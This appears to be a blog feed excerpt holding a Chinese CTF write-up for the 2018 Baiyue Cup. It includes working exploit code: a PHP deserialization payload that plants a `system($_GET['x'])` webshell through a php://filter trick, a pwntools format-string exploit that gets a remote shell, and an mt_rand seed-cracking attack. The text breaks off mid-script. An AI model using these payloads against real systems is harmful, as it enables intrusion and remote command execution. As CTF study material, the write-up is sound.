        &lt;p&gt;最近的一次CTF中遇到了一题nodejs反序列化的题, 题目直接提示反序列化, 然而之前并没有接触过这一块的东西, 结果就是知道思路但是不知如何利用. 比赛结束后我就学习了一下这一块的知识, 网上分析的比较多的都是CVE-2017-5941, 这个CVE主要是因为&lt;code
      
    
    </summary>
    
    
      <category term="WEB" scheme="http://lxzmads.github.io/tags/WEB/"/>
    
      <category term="反序列化" scheme="http://lxzmads.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
      <category term="nodejs" scheme="http://lxzmads.github.io/tags/nodejs/"/>
    
  </entry>
  
  <entry>
    <title>福建省2018百越杯线上赛部分题解</title>
    <link href="http://lxzmads.github.io/2018/12/02/%E7%A6%8F%E5%BB%BA%E7%9C%812018%E7%99%BE%E8%B6%8A%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"/>
    <id>http://lxzmads.github.io/2018/12/02/福建省2018百越杯线上赛部分题解/</id>
    <published>2018-12-01T16:00:00.000Z</published>
    <updated>2019-02-17T08:05:38.000Z</updated>
    
    <content type="html"><![CDATA[<p>很开心，我这个菜鸡竟然可以开始做pwn题了，发个wp纪念下。 （虽然是很简单的</p><h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><p><img src="https://i.loli.net/2018/12/01/5c02746289864.png" alt="20181201194539.png"></p><p>找个在线解数独的网站, 输进去后排成一行如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">473615928216984753598237164651892437942376815387451296834529671125768349769143582</span><br></pre></td></tr></table></figure><p>md5后提交.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;cee3860fb3f4a52e615fa8aaf3c91f2b&#125;</span><br></pre></td></tr></table></figure><h1 id="血小板天下第一可爱"><a href="#血小板天下第一可爱" class="headerlink" title="血小板天下第一可爱"></a>血小板天下第一可爱</h1><p>将二维码其他两个定位块用PS补齐, 扫码得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a2V5JTNBJTIwTHNiXzFzX2dyM2F0</span><br></pre></td></tr></table></figure><p>base64 解码得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key: Lsb_1s_gr3at</span><br></pre></td></tr></table></figure><p>提示LSB隐写, 于是用<code>Stegsolve</code>的<code>Data Extract</code>将图片低位提取出来, 然后用AES解密得到flag, 密钥就是<code>Lsb_1s_gr3at</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1_l0ve_LSB~&#125;</span><br></pre></td></tr></table></figure><h1 id="flag-universe"><a href="#flag-universe" class="headerlink" title="flag_universe"></a>flag_universe</h1><p>分析流量包, 是一个FTP传输过程的流量. 从流量中可以看出文件夹有哪些文件</p><p><img src="https://i.loli.net/2018/12/01/5c0275c1d1e11.png" alt="20181201195127.png"></p><p>然后下载了universe.png, 但是好像是因为网络原因, 下载过程不是很顺利, 这导致了诸如<code>foremost</code>、<code>binwalk</code>、<code>tcpxtract</code>等工具提取出来的图片总有残缺, 然后又下载了<code>flag.txt</code>, 内容是<code>ZmxhZ3tUaGlzIGlzIGZha2UgZmxhZyBoYWhhaGF9</code>, base64解码后发现白高兴一场<code>flag{This is fake flag hahaha}</code>. </p><p>接着分析流量, 发现宿主机向ftp主机上传了一张<code>new_universe.png</code>.</p><p><img src="https://i.loli.net/2018/12/01/5c02768678b7a.png" alt="20181201195448.png"></p><p>我们利用<code>wireshark</code>的流追踪工具把两张图片提取出来. 两张图片, 先<code>diff</code>一下, 发现<code>new_universe.png</code>比<code>universe.png</code>大, 确认下确实不是一张图片了. 然后我想到了盲水印, 然后试了下并不是. 之后试了很多种方法, 发现竟然又是LSB? (What the fuck!</p><p>得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Plate_err_klaus_Mail_Life&#125;</span><br></pre></td></tr></table></figure><h1 id="simple-ser"><a href="#simple-ser" class="headerlink" title="simple ser"></a>simple ser</h1><p>给了源码, 那就开始看吧. </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cls1</span></span>&#123; </span><br><span class="line">    <span class="keyword">var</span> $cls; </span><br><span class="line">    <span class="keyword">var</span> $arr; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">()</span></span>&#123; </span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123; </span><br><span class="line">        <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;arr <span class="keyword">as</span> $k =&gt; $v)&#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;cls-&gt;$v; </span><br><span class="line">        &#125; </span><br><span class="line">         </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cls2</span></span>&#123; </span><br><span class="line">    <span class="keyword">var</span> $filename = <span class="string">'hello.php'</span>; </span><br><span class="line">    <span class="keyword">var</span> $txt = <span class="string">''</span>; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123; </span><br><span class="line">        <span class="keyword">if</span>($key == <span class="string">'fileput'</span>)&#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fileput(); </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="string">'&lt;p&gt;'</span>.htmlspecialchars($key).<span class="string">'&lt;/p&gt;'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fileput</span><span class="params">()</span></span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(    strpos(<span class="keyword">$this</span>-&gt;filename,<span class="string">'../'</span>) !== <span class="keyword">false</span> || </span><br><span class="line">            strpos(<span class="keyword">$this</span>-&gt;filename,<span class="string">'\\'</span>) !== <span class="keyword">false</span>      </span><br><span class="line">        ) <span class="keyword">die</span>(); </span><br><span class="line"></span><br><span class="line">        $content = <span class="string">'&lt;?php die(\'stupid\'); ?&gt;'</span>; </span><br><span class="line">        $content .= <span class="keyword">$this</span>-&gt;txt; </span><br><span class="line">        file_put_contents(<span class="keyword">$this</span>-&gt;filename, $content); </span><br><span class="line">        <span class="keyword">return</span> htmlspecialchars($content); </span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST))&#123; </span><br><span class="line">    $cls = base64_decode($_POST[<span class="string">'ser'</span>]); </span><br><span class="line">    $instance = unserialize($cls); </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    $a = <span class="keyword">new</span> cls1(); </span><br><span class="line">    $a-&gt;show(); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>顺着源码意思, 基本思路就出来了. 我们的目标是激活<code>cls2</code>的<code>fileput</code>方法写入一个文件. <code>fileput</code>方法可以通过<code>cls2</code>的<code>__get</code>魔术方法激活, 于是我们<code>cls1</code>的<code>cls</code>属性就是<code>cls2</code>, <code>arr</code>中需要有一个<code>v</code>是<code>fileput</code>. 到这里我们就可以激活<code>fileput</code>方法写入一个开头内容总是<code>&lt;?php die(\&#39;stupid\&#39;); ?&gt;</code>的文件. 这里我们可以想到, php中的文件名可以包一层伪协议, 从而控制文件名对应文件的内容. 看<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">这篇</a>, 我们可以用base64的过滤器来绕过。具体payload如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$c1 = <span class="keyword">new</span> cls1;</span><br><span class="line">$c2 = <span class="keyword">new</span> cls2;</span><br><span class="line">$c2-&gt;filename = <span class="string">'php://filter/write=convert.base64-decode/resource=mads.php'</span>;</span><br><span class="line">$c2-&gt;txt = <span class="string">"PD9waHAgc3lzdGVtKCRfR0VUWyd4J10pOyA/Pg=="</span>;</span><br><span class="line">$c1-&gt;cls = $c2;</span><br><span class="line">$c1-&gt;arr = <span class="keyword">array</span>(<span class="string">"1"</span>=&gt;<span class="string">"fileput"</span>);</span><br><span class="line"></span><br><span class="line">$sc1 = serialize($c1);</span><br><span class="line"><span class="keyword">echo</span> base64_encode($sc1);</span><br><span class="line"></span><br><span class="line"><span class="comment">// echo base64_encode("<span class="meta">&lt;?php</span> system(\$_GET['x']); <span class="meta">?&gt;</span>");</span></span><br></pre></td></tr></table></figure><p>将序列化的对象传入, 就写入了一个一句话. <code>&lt;?php system(\$_GET[&#39;x&#39;]); ?&gt;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">"ser"</span>: <span class="string">"Tzo0OiJjbHMxIjoyOntzOjM6ImNscyI7Tzo0OiJjbHMyIjoyOntzOjg6ImZpbGVuYW1lIjtzOjU4OiJwaHA6Ly9maWx0ZXIvd3JpdGU9Y29udmVydC5iYXNlNjQtZGVjb2RlL3Jlc291cmNlPW1hZHMucGhwIjtzOjM6InR4dCI7czo0MDoiUEQ5d2FIQWdjM2x6ZEdWdEtDUmZSMFZVV3lkNEoxMHBPeUEvUGc9PSI7fXM6MzoiYXJyIjthOjE6e2k6MTtzOjc6ImZpbGVwdXQiO319="</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://762062d1c2404bdcb437c4635a998747e185496ea2b04f1d.game.ichunqiu.com/'</span></span><br><span class="line">r = requests.post(url = url, data=data)</span><br><span class="line"><span class="comment"># print r.text</span></span><br></pre></td></tr></table></figure><p>读取根目录下<code>flag</code>文件, 得到flag.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;0970e0b1-e35f-4795-ad12-276099ae94a0&#125;</span><br></pre></td></tr></table></figure><h1 id="format"><a href="#format" class="headerlink" title="format"></a>format</h1><p>提示的很明显, 是一个格式化字符串漏洞, 逻辑也很简单, 覆盖bss段上一个全局变量值为192就给一个shell. 直接上exp！(没想到第一次在比赛做出来的pwn的wp是这么精简！！！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">secret = <span class="number">0x804a048</span></span><br><span class="line"><span class="comment">#p = process('./format')</span></span><br><span class="line">p = remote(<span class="string">'117.50.13.182'</span>,<span class="number">33865</span>)</span><br><span class="line">payload = p32(secret) + <span class="string">'%0188x%11$n'</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># flag&#123;0e3c9bee-b694-4f9c-b888-e84943037d67&#125;</span></span><br></pre></td></tr></table></figure><h1 id="Download-it"><a href="#Download-it" class="headerlink" title="Download it"></a>Download it</h1><p>题目提示mt_rand. 搜了一下, php的mt_rand有个伪随机数的种子空间太小可以爆破的问题, 并且是版本通杀的。已经有人用c写了个高效的爆破, <a href="https://github.com/lepiaf/php_mt_seed" target="_blank" rel="noopener">https://github.com/lepiaf/php_mt_seed</a>. 具体分析可以看<a href="http://wonderkun.cc/index.html/?p=585" target="_blank" rel="noopener">这里</a>. 看题目.</p><p><img src="https://i.loli.net/2018/12/01/5c026d12885cc.png" alt="20181201191427.png"></p><p>大概浏览之后发现有三个功能页, <code>Download</code>页面可以下载三个静态文件, <code>install.php</code>页面可以看<code>install.php</code>源码, <code>download.php</code>可以看<code>download.php</code>源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* install.php */</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/* VSERION = 7.0.30 */</span></span><br><span class="line"><span class="keyword">if</span>(file_exists(<span class="string">'install.lock'</span>))&#123;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gen_rand</span><span class="params">($length)</span></span>&#123;</span><br><span class="line">$chars = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span>;</span><br><span class="line">$randstr = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ ) &#123;</span><br><span class="line">$randstr .= $chars[ mt_rand(<span class="number">0</span>, strlen($chars) - <span class="number">1</span>) ];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $randstr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wfile</span><span class="params">($filename, $content=<span class="string">""</span>)</span></span>&#123;</span><br><span class="line">$fp  = @fopen($filename, <span class="string">'w'</span>);</span><br><span class="line">@fwrite($fp,$content);</span><br><span class="line">@fclose($fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wfile(<span class="string">'install.lock'</span>,<span class="string">''</span>);</span><br><span class="line">wfile(gen_rand(<span class="number">8</span>).<span class="string">'.php'</span>, <span class="string">"&lt;?php //flag&#123;*****&#125;"</span>);</span><br><span class="line">wfile(<span class="string">'authcode.php'</span>,<span class="string">"&lt;?php\n/*"</span>.gen_rand(<span class="number">32</span>).<span class="string">'*/?&gt;'</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* download.php */</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*代码加密后用URL传递*/</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">authcode</span><span class="params">($string, $operation = <span class="string">'DECODE'</span>, $key , $expiry = <span class="number">0</span>)</span> </span>&#123;</span><br><span class="line">$ckey_length = <span class="number">4</span>; </span><br><span class="line"></span><br><span class="line">$key = md5($key);</span><br><span class="line">$keya = md5(substr($key, <span class="number">0</span>, <span class="number">16</span>));</span><br><span class="line">$keyb = md5(substr($key, <span class="number">16</span>, <span class="number">16</span>));</span><br><span class="line">$keyc = $ckey_length ? ($operation == <span class="string">'DECODE'</span> ? substr($string, <span class="number">0</span>, $ckey_length): substr(md5(microtime()), -$ckey_length)) : <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">$cryptkey = $keya.md5($keya.$keyc);</span><br><span class="line">$key_length = strlen($cryptkey);</span><br><span class="line"></span><br><span class="line">$string = $operation == <span class="string">'DECODE'</span> ? base64_decode(substr($string, $ckey_length)) : sprintf(<span class="string">'%010d'</span>, $expiry ? $expiry + time() : <span class="number">0</span>).substr(md5($string.$keyb), <span class="number">0</span>, <span class="number">16</span>).$string;</span><br><span class="line">$string_length = strlen($string);</span><br><span class="line"></span><br><span class="line">$result = <span class="string">''</span>;</span><br><span class="line">$box = range(<span class="number">0</span>, <span class="number">255</span>);</span><br><span class="line"></span><br><span class="line">$rndkey = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt;= <span class="number">255</span>; $i++) &#123;</span><br><span class="line">$rndkey[$i] = ord($cryptkey[$i % $key_length]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>($j = $i = <span class="number">0</span>; $i &lt; <span class="number">256</span>; $i++) &#123;</span><br><span class="line">$j = ($j + $box[$i] + $rndkey[$i]) % <span class="number">256</span>;</span><br><span class="line">$tmp = $box[$i];</span><br><span class="line">$box[$i] = $box[$j];</span><br><span class="line">$box[$j] = $tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>($a = $j = $i = <span class="number">0</span>; $i &lt; $string_length; $i++) &#123;</span><br><span class="line">$a = ($a + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">$j = ($j + $box[$a]) % <span class="number">256</span>;</span><br><span class="line">$tmp = $box[$a];</span><br><span class="line">$box[$a] = $box[$j];</span><br><span class="line">$box[$j] = $tmp;</span><br><span class="line">$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % <span class="number">256</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($operation == <span class="string">'DECODE'</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>((substr($result, <span class="number">0</span>, <span class="number">10</span>) == <span class="number">0</span> || substr($result, <span class="number">0</span>, <span class="number">10</span>) - time() &gt; <span class="number">0</span>) &amp;&amp; substr($result, <span class="number">10</span>, <span class="number">16</span>) == substr(md5(substr($result, <span class="number">26</span>).$keyb), <span class="number">0</span>, <span class="number">16</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> substr($result, <span class="number">26</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> $keyc.str_replace(<span class="string">'='</span>, <span class="string">''</span>, base64_encode($result));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">file_down</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (! file_exists ( $filename )) &#123;    </span><br><span class="line"><span class="keyword">exit</span> ();    </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$file = fopen ( $filename, <span class="string">"r"</span> );  </span><br><span class="line">Header ( <span class="string">"Content-type: application/octet-stream"</span> );    </span><br><span class="line">Header ( <span class="string">"Accept-Ranges: bytes"</span> );    </span><br><span class="line">Header ( <span class="string">"Accept-Length: "</span> . filesize ( $filename ) );    </span><br><span class="line">Header ( <span class="string">"Content-Disposition: attachment; filename="</span> . $filename ); </span><br><span class="line"><span class="keyword">echo</span> @fread ( $file, filesize ( $filename ) );    </span><br><span class="line">fclose ( $file );  </span><br><span class="line"><span class="keyword">exit</span>(); </span><br><span class="line">&#125;    </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$key=trim(file_get_contents(<span class="string">'authcode.php'</span>));</span><br><span class="line">$key=str_replace(<span class="string">"&lt;?php\n/*"</span>,<span class="string">''</span>,$key);</span><br><span class="line">$key=str_replace(<span class="string">'*/?&gt;'</span>,<span class="string">''</span>,$key);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_GET))&#123;</span><br><span class="line">$download = authcode($_GET[<span class="string">'download'</span>], <span class="string">'DECODE'</span>,$key);</span><br><span class="line"><span class="keyword">if</span>($download)&#123;</span><br><span class="line">parse_str($download, $file);</span><br><span class="line">@file_down($file[<span class="string">'filename'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析源码功能可以发现就是一个给经过加密的文件名, 例如<code>filename=mads.php</code>经过<code>authcode</code>函数加密, 将结果传给<code>download.php</code>的<code>download</code>参数就可以下载<code>mads.php</code>. 关键就是需要知道<code>authcode</code>的参数<code>$key</code>就可以任意文件下载了. 而<code>$key</code>是<code>mt_rand()</code>函数生成的, 所以我们是可以得到的. 在<code>$key</code>生成之前还调用了<code>mt_rand()</code>生成了一个文件名, 通过题目给的源码发现里面可能是flag(然而并不是, 坑点). 这里卡了很久, 结果在<code>Download</code>标签查看源码发现了玄机….(做题做的源码都不会看了).</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 部分html源码 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Main component for a primary marketing message or call to action --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"jumbotron container"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"text-center"</span>&gt;</span>DownLoad<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"text-center"</span>&gt;</span>Flag is here, try to get it.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"btn btn-lg btn-success col-md-offset-2"</span> <span class="attr">href</span>=<span class="string">"download.php?download=27baEWffY%2FD0cpMkVEVoGejGy4e2rC3kGMgIwbaevC3cjQW92jFZfRhcLvfrkw07ZPiwFQ"</span> &gt;</span>CTF Introduction<span class="tag">&lt;/<span class="name">a</span>&gt;</span> </span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"btn btn-lg btn-success col-md-offset-1"</span> <span class="attr">href</span>=<span class="string">"download.php?download=ecefwBCHkfr7%2FiJxJmgISzhE09t%2F3c6ZgGszQloZEmd%2FxPr6iFTdb8vWME1Wa%2F7ZHK%2FBA6qh1A"</span> &gt;</span>DEFCON Introduction<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"btn btn-lg btn-success col-md-offset-1"</span> <span class="attr">href</span>=<span class="string">"download.php?download=6ba8aFlAiTCx6gvneNTBrFJmCn%2FSnsbtIgHucODw%2FQs8Geu7RUs7iWZp6dE1BLqjWVuARwY"</span> &gt;</span>FLAG<span class="tag">&lt;/<span class="name">a</span>&gt;</span> </span><br><span class="line">            <span class="comment">&lt;!-- &lt;a class="btn btn-lg btn-success" href="download.php?download=e47dc5Sjdiy%2FO1aTX0nOjboCI3qdNljrSkHZ33lFSqb9mFnMU5j6pv7qSUGLI4vX9dk" &gt;&lt;/a&gt;  --&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>看到了有行注释掉的下载链接, 下载下来是个名为<code>35hGm34y.php</code>, 内容为<code>&lt;?php //flag{This is fake flag, but it looks useful}</code>的文件. 咦, 看起来这么眼熟, 这难道就是源码中提示的有flag的文件? 我们抱着怀疑试试, 利用得到的<code>gen_rand()</code>函数生成的前6个字符, 再利用上面提到的工具爆破种子, 接着就可以得到<code>$key</code>!. 根据前六个字符生成前六个伪随机数的脚本如下:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">words = string.ascii_letters + string.digits</span><br><span class="line"><span class="keyword">print</span> len(words)</span><br><span class="line">key = <span class="string">'35hGm34y'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">    <span class="keyword">print</span> words.index(i),</span><br></pre></td></tr></table></figure></p><p>爆破得到一个可能的种子<br><img src="https://i.loli.net/2018/12/01/5c0270ae08a57.png" alt="20181201192951.png"></p><p>利用种子解密之前下载<code>35hGm34y.php</code>的文件名试试, 得到<code>filename=35hGm34y.php</code>, 证明我们的猜想是对的!</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 证明脚本 注意版本是 7.0.x */</span></span><br><span class="line">$seed = <span class="number">3559020430</span>;</span><br><span class="line">mt_srand($seed);</span><br><span class="line">gen_rand(<span class="number">8</span>);</span><br><span class="line">$key = gen_rand(<span class="number">32</span>);<span class="comment">//'r9BsGsvcNnY8jYA5XD9rUgY2hpSiTMcp';</span></span><br><span class="line">$m = <span class="string">'e47dc5Sjdiy/O1aTX0nOjboCI3qdNljrSkHZ33lFSqb9mFnMU5j6pv7qSUGLI4vX9dk'</span>;</span><br><span class="line"><span class="keyword">echo</span> authcode($m, <span class="string">'DECODE'</span>, $key); <span 